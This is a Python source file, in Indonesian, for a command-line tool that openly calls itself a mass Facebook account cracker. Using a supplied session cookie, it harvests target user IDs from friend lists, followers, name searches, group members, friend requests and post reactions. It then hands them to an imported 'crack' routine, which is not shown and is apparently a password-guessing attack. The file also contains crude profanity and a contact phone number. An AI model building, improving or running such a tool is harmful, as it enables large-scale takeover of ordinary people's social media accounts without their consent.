# coding:utf-8

from modul import *
from ajg.login import login
from .ngewe import crack as cracking
from .ngewe import gadag_user as asu
import itertools,os,sys,time,datetime


M = '\x1b[1;31m'
U = '\x1b[1;36m'
P = '\x1b[1;37m'
H = '\x1b[1;32m'
K = '\x1b[1;33m'
m = '\x1b[0;31m'
u = '\x1b[0;36m'
p = '\x1b[0;37m'
h = '\x1b[0;32m'
k = '\x1b[0;33m'

url="https://mbasic.facebook.com"
longentod="lo lebih ngentod"
ip = requests.get('https://api.ipify.org').text
logo=("\n"+K+"__________ ________      _____ _____________________\n\______   \\\_____  \    /     \\\______   \_   _____/ \n |       _/ /   |   \  /  \ /  \|    |  _/|    __)  \n |    |   \/    |    \/    Y    \    |   \|     \   \n |____|_  /\_______  /\____|__  /______  /\___  /   \n        \/         \/         \/       \/     \/    \n "+P+"[#]------------------------------------------------ \n [*] Coded by  : Romi Afrizal & Azmi tamvan \n "+P+"[*] Github me : https://github.com/kangcrack \n [*] Facebook  : facebook.com/Bang.badru23  \n \x1b[1;97m[#]------------------------------------------------ \n [*] Premium?  :"+M+" Tidak "+P+"\n [*] Alamat ip :"+H+" "+ip+" ")


def tik():
    titik = [
     '   ']
    for o in titik:
        print ('\r\x1b[1;97m\n [•] Mohon Tunggu... \n [•] Memeriksa untuk premium '+H+'>_< ' + o),
        sys.stdout.flush()
        time.sleep(6)
def jalan(z):
	for e in z + '\n':
		sys.stdout.write(e)
		sys.stdout.flush()
		time.sleep(0.02)
def prem():
	os.system ('clear')
	jalan(P+' [*] Status : '+M+'Tidak premium '+P+'awokawokawok kasihan')
	time.sleep(3)
        
        
class awokawokawok:
	def __init__(self):
		
		self.cek_folder()
		self.semua=open("cookies/info.txt").read()
		self.jonson=json.loads(self.semua)
		self.cookies=self.jonson["cookies"]
		self.main_menu()
		
	def cek_folder(self):
		if os.path.exists("result") is False: os.mkdir("result")
		if os.path.exists("cookies") is False: os.mkdir("cookies")
		if os.path.exists("result/live.txt") is False: open("result/live.txt","a")
		if os.path.exists("result/chek.txt") is False: open("result/chek.txt","a")
		if os.path.exists("cookies/info.txt") is False:
			os.system("clear")
			print("\n"+p+"[*] Hello word👋 selamat datang :)")
			print(p+"[*] Sebuah tools untuk mengCrack akun facebook (Hacking secara massal/acak) ")
			print(p+"[*] Supaya tools ini dapat di gunakan silahkan masukan cookies facebook anda! ")
			print(p+"[*] Link youtube 👉"+h+" https://youtu.be/b9crrvr6d2s"+p+" 👈 tutorial Mendapatkan cookies")
			print(p+"[*] "+m+"Script ini tidak untuk di perjualbelikan!,hubungi whatsap gua jika ada yg jual script ini!")
			print(p+"[*] "+h+"WhatsAp"+p+" : "+h+"08811403654 ")
			print (p+"[#]------------------------------------------------")
			cookie=input("\n"+P+" [?] cookies :"+K+" ")
			while cookie in (""," "):
				print (M+' [!] Isi yang benar')
				cookie=input("\n"+P+" [?] cookies :"+K+" ")
			login(url,{"cookie":cookie})
			
	
	def cek_cookies(self):
		global url
		try: respon=req.get(f"{url}/profile.php",cookies=self.cookies)
		except koneksi_error: exit(M+" [!] Tidak ada koneksi")
		if "mbasic_logout_button" not in respon.text:
			try: os.remove("cookies/info.txt");os.remove("cookies/token.txt")
			except: os.system("rm -rf cookies/info.txt && rm -rf cookies/token.txt")
			exit(M+" [!] cookie invalid, harap login ulang")
		url=url.replace("mbasic","free") if "free.facebook" in respon.url else url
		os.system("clear")
	
	#def logo_banner(self):
		#os.system ('clear')
		#print('\n'+K+'__________ ________      _____ _____________________\n\______   \\\_____  \    /     \\\______   \_   _____/ \n |       _/ /   |   \  /  \ /  \|    |  _/|    __)  \n |    |   \/    |    \/    Y    \    |   \|     \   \n |____|_  /\_______  /\____|__  /______  /\___  /   \n        \/         \/         \/       \/     \/    \n '+P+'[#]------------------------------------------------ \n [*] Coded by  : '+P+'Muhamad Badru Wasih \n '+P+'[*] Github me : https://github.com/kangcrack \n [*] Facebook  : facebook.com/Bang.badru23  \n \x1b[1;97m[#]------------------------------------------------  ')
		#print(P+' [*] Alamat ip :'+H+' '+ip)
		#print(52*'\x1b[1;97m═')
		
	
	def main_menu(self):
		global longentod
		self.cek_cookies()
		takeuser=asu(url,self.cookies)
		tik()
		prem()
		os.system ('clear')
		ip = requests.get('https://api.ipify.org').text
		print('\n'+K+'__________ ________      _____ _____________________\n\______   \\\_____  \    /     \\\______   \_   _____/ \n |       _/ /   |   \  /  \ /  \|    |  _/|    __)  \n |    |   \/    |    \/    Y    \    |   \|     \   \n |____|_  /\_______  /\____|__  /______  /\___  /   \n        \/         \/         \/       \/     \/    \n '+P+'[#]------------------------------------------------ \n [*] Coded by  : '+P+'Muhamad Badru Wasih \n '+P+'[*] Github me : https://github.com/kangcrack \n [*] Facebook  : facebook.com/Bang.badru23  \n \x1b[1;97m[#]------------------------------------------------  ')
		jalan(P+' [*] Premium?  :'+M+' Tidak ')
		time.sleep(0.2)
		print(P+' [*] Alamat ip :'+H+' '+ip)
		time.sleep(0.2)
		print(52*'\x1b[1;97m═')
		time.sleep(0.2)
		#print(f" [*] uid  : {self.jonson['uid']}")
		print(f"\x1b[1;97m [ Welcome \x1b[1;92m{self.jonson['nama']}\x1b[1;97m ]")
		#print(f" [*] username : {self.jonson['username']}\n" if self.jonson["username"] is not None else "")
		print(52*'\x1b[1;97m═')
		print(P+" [01] crack dari daftar teman")
		print(P+" [02] crack dari daftar teman publik")
		print(P+" [03] crack dari followers")
		print(P+" [04] crack dari pencarian nama")
		print(P+" [05] crack dari group")
		print(P+" [06] crack dari permintaan pertemanan")
		print(P+" [07] crack dari like postingan")
		print(P+" ["+H+"08"+P+"] "+H+"update tools")
		print(P+" ["+M+"09"+P+"] "+M+"hapus cookie")
		print(P+" ["+M+"00"+P+"] "+M+"Keluar")
		print(52*'\x1b[1;97m═')
		
		pilih=input(P+' [?] pilih >'+K+' ')
		while pilih in (""," "):
			print ('\x1b[1;91m [!] Isi yang benar')
			pilih=input(P+' [?] pilih >'+K+' ')
			
		if pilih in ("3","03"):
			os.system ('clear')
			print (logo)
			print(52*'\x1b[1;97m═')
			print (P+" [*] Masukin username/id facebook nya ajah yah ")
			user=input(P+" [?] user Id :"+K+" ")
			while user in (""," "):
				print ('\x1b[1;91m [!] Isi yang benar')
				user=input(P+" [?] user Id :"+K+" ")
			usek=f"{url}/profile.php?id={user}&v=followers" if user.isdigit() else f"{url}/{user}?v=followers"
			try: respon=req.get(usek,cookies=self.cookies).text
			except koneksi_error: exit("\x1b[1;91m [!] Tidak ada koneksi !")
			if "Halaman Tidak Ditemukan" in respon or "Konten Tidak Ditemukan" in respon:
				kembali(f"\x1b[1;91m [!] Pengguna {user} tidak ditemukan" if user.isdigit() else f"\x1b[1;91m [!] Pengguna {user} tidak ditemukan",self.main_menu)
			if "Anda Tidak Dapat Menggunakan Fitur Ini Sekarang" in respon:
				kembali("\x1b[1;91m [!] limit bro, silahkan ganti akun",self.main_menu)
			else:
				print(P+" [*] Nama akun :"+H+" "+parser(respon,"html.parser").find("title").text)
				longentod=takeuser.followers(respon)
			
		elif pilih in ("1","01"):
			os.system ('clear')
			print (logo)
			print(52*'\x1b[1;97m═')
			print (" [*] Crack daftar teman facebook anda sendiri")
			try: respon=req.get(f"{url}/me/friends",cookies=self.cookies).text
			except koneksi_error: exit("\x1b[1;91m [!] Tidak ada koneksi !")
			if "Tidak Ada Teman Untuk Ditampilkan" in respon:
				kembali("\x1b[1;91 [!] tidak ada teman",self.main_menu)
			longentod=takeuser.fl(respon)
			
		elif pilih in ("5","05"):
			os.system ('clear')
			print (logo)
			print(52*'\x1b[1;97m═')
			print ('\x1b[1;97m [!] Pastikan anda sudah bergabung dengan grup ')
			user=input(P+" [?] Id group :"+K+" ")
			while user in (""," "):
				print ('\x1b[1;91m [!] Isi yang benar')
				user=input(P+" [?] Id group :"+K+" ")
			usek=f"{url}/browse/group/members/?id={user}"
			try: respon=req.get(usek,cookies=self.cookies).text
			except koneksi_error: exit("\x1b[1;91m [!] Tidak ada koneksi !")
			if "Halaman Tidak Ditemukan" in respon or "Konten Tidak Ditemukan" in respon:
				kembali(f"\x1b[1;91m [!] id grup {user} tidak di temukan",self.main_menu)
			if "Anda Tidak Dapat Menggunakan Fitur Ini Sekarang" in respon:
				kembali("\x1b[1;91m [!] limit bro, silahkan ganti akun",self.main_menu)
			else:
				#batas=input(P+" [?] jumlah :\x1b[1;93m ")
				#while batas.isdigit() is False:
					#print ("\x1b[1;91m [!] Isi yang benar" if batas in (""," ") else ""+M+"[!] harus berupa angka")
					#batas=input(P+" [?] jumlah :\x1b[1;93m ")
				print(P+" [*] Nama grup :\x1b[1;32m "+parser(respon,"html.parser").find("title").text[8:])
				longentod=takeuser.grup(respon,user)
				#longentod=takeuser.grup(respon,int(batas))
				
		elif pilih in ("4","04"):
			os.system ('clear')
			print (logo)
			print(52*'\x1b[1;97m═')
			print(P+" [*] contoh nama :"+H+" Sugiono ")
			user=input(P+" [?] nama :"+K+" ")
			while user in (""," "):
				print ('\x1b[1;91m [!] Isi yang benar')
				user=input(P+" [?] nama :"+K+" ")
			usek=f"{url}/search/people/?q={user}"
			try: respon=req.get(usek,cookies=self.cookies).text
			except koneksi_error: exit("\x1b[1;91m [!] Tidak ada koneksi !")
			if "Maaf, kami tidak menemukan" in respon:
				kembali(f" \x1b[1;91m[!] dengan nama {user} tidak ditemukan",self.main_menu)
			else:
				jumlah=input(P+" [?] jumlah :"+K+" ")
				while jumlah.isdigit() is False:
					print ("\x1b[1;91m [!] Isi yang benar" if jumlah in (""," ") else " ! harus berupa angka")
					jumlah=input(P+" [?] jumlah :"+K+" ")
				longentod=takeuser.cari(respon,int(jumlah))
			
		elif pilih in ("2","02"):
			os.system ('clear')
			print (logo)
			print(52*'\x1b[1;97m═')
			print (P+" [*] Masukin username/id facebook nya ajah yah ")
			user=input(P+" [?] user id :"+K+" ")
			while user in (""," "):
				print ('\x1b[1;91m [!] Isi yang benar')
				user=input(P+" [?] user id :"+K+" ")
			usek=f"{url}/profile.php?id={user}&v=friends" if user.isdigit() else f"{url}/{user}/friends"
			try: respon=req.get(usek,cookies=self.cookies).text
			except koneksi_error: exit("\x1b[1;91m [!] Tidak ada koneksi !")
			if "Tidak Ada Teman Untuk Ditampilkan" in respon:
				kembali("\x1b[1;91m [!] daftar teman tidak di publik",self.main_menu)
			if "Anda Tidak Dapat Menggunakan Fitur Ini Sekarang" in respon:
				kembali("\x1b[1;91m [!] limit bro, silahkan ganti akun",self.main_menu)
			if "Konten Tidak Ditemukan" in respon or "Halaman yang Anda minta tidak ditemukan." in respon:
				kembali(f" \x1b[1;91m[!] id {user} tidak ditemukan" if user.isdigit() else f" ! pengguna dengan username {user} tidak ditemukan",self.main_menu)
			else:
				print(" \x1b[1;97m[*] target name :"+H+" "+parser(respon,"html.parser").find("title").text)
				longentod=takeuser.fl(respon)
			
		elif pilih in ("6","06"):
			os.system ('clear')
			print (logo)
			print(52*'\x1b[1;97m═')
			print(' [*] Di acc ajg kalau ada yg kirim pertemanan-_ ')
			try: respon=req.get(f"{url}/friends/center/requests/#friends_center_main",cookies=self.cookies).text
			except koneksi_error: exit("\x1b[1;91m [!] Tidak ada koneksi !")
			if "Tidak Ada Permintaan" in respon:
				kembali(" \x1b[1;91m[!] tidak ada permintaan pertemanan",self.main_menu)
			longentod=takeuser.request(respon)
			
		elif pilih in ("7","07"):
			os.system ('clear')
			print (logo)
			print(52*'\x1b[1;97m═')
			print (P+" [*] Masukin link/id postingan nya ajah yah ")
			user=input(" \x1b[1;97m[?] url/id post : \x1b[1;93m")
			while user in (""," "):
				print ("\x1b[1;91m [!] Isi yang benar")
				user=input("\x1b[1;97m [?] url/id post : \x1b[1;93m")
			if user.isdigit():
				user=f"{url}/{user}"
			else:
				try: asyu=re.search("https://(.*?)\.facebook\.com/",user).group(1)
				except AttributeError: exit(" \x1b[1;91m[!] masukkan url postingan dengan benar")
				user=url+user.split(f"https://{asyu}.facebook.com")[1]
			try: respon=req.get(user,cookies=self.cookies).text
			except koneksi_error: exit("\x1b[1;91m [!] Tidak ada koneksi ")
			if "Halaman yang diminta tidak bisa ditampilkan sekarang." in respon:
				kembali(" \x1b[1;91m[!] postingan tidak ditemukan",self.main_menu)
			try:
				ufi=re.search('\<a\ href\=\"\/ufi\/reaction\/profile\/browser\/(.*?)"',respon).group(1).replace(";","&")
				respon=req.get(f"{url}/ufi/reaction/profile/browser/{ufi}",cookies=self.cookies).text
				if "Semua 0" in respon or "Orang yang menanggapi" not in respon:
					kembali(" \x1b[1;91m[!] tidak ada yang menanggapi postingan",self.main_menu)
				jumlah=input("\x1b[1;97m [?] jumlah :\x1b[1;93m ")
				while jumlah.isdigit() is False:
					print(" \x1b[1;91m[!] Isi yang benar" if jumlah in (""," ") else " ! harus berupa angka")
					jumlah=input(" \x1b[1;97m[?] jumlah :\x1b[1;93m ")
				longentod=takeuser.like_post(respon,int(jumlah))
			except AttributeError: exit("\x1b[1;91m [!] error tidak diketahui")
			except koneksi_error: exit("\x1b[1;91m [!] Tidak ada koneksi")
			
		elif pilih in ("8","08"):
			os.system('clear')
			os.system('pkg update && pkg upgrade')
			os.system('git pull')
			os.system('python Dru.py')
			
		elif pilih in ("9","09"):
			try: os.remove("cookies/info.txt");os.remove("cookies/token.txt")
			except: os.system("rm -rf cookies/info.txt && rm -rf cookies/token.txt")
			exit(" \x1b[1;91m[!] Gagal menghapus cookie " if os.path.exists("cookies/info.txt") else ""+H+" [✓] sukses menghapus cookie")
		
		elif pilih in ("0","00"):
			exit("\n \x1b[1;97m[*] Terima kasih telah menggunakan tools ini :)")
		
		else:
			kembali("\x1b[1;91m [!] Isi yang benar",self.main_menu)
		
		if longentod!="lo lebih ngentod":
			if len(longentod)!=0:
				cracking.crack(url,longentod)
			else:
				exit("\x1b[1;91m [!] Gagal mengambil id ")
		else:
			exit(" \x1b[1;91m[!] error tidak diketahui")
